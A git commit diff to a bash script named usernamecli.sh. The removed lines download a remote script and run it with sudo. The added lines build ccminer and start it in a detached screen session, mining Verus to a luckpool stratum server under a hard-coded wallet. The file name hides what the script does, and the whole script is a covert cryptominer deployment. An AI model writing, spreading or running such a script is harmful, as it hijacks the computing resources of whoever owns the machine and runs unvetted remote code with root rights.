a34557a75652bedf2658e745bfe03c2db0aa7a36
TrafikApostel <56306440+TrafikApostel@users.noreply.github.com>
2022-09-14 17:25:41 +0300

    Update usernamecli.sh

--- usernamecli.sh
+++ usernamecli.sh
@@ -1,5 +1,9 @@
 #!/bin/bash
-wget -P /home/ubuntu https://github.com/TrafikApostel/TrafikApostel/blob/main/uservrsk.sh
-sudo chmod +x /home/ubuntu/uservrsk.sh
-sleep 6
-sudo /home/ubuntu/uservrsk.sh
+sudo apt update -y && sudo apt install -y screen libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential git mc htop
+sudo git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
+cd ccminer
+sudo chmod +x build.sh 
+sudo chmod +x configure.sh 
+sudo chmod +x autogen.sh 
+sudo ./build.sh
+sudo screen -A -m -d ./ccminer -a verus -o stratum+tcp://eu.luckpool.net:3957#xnsub -u RMuiec4VNC5NjMrT1NRQQUmjxHndPKqd7r.testfull -p x -t 1
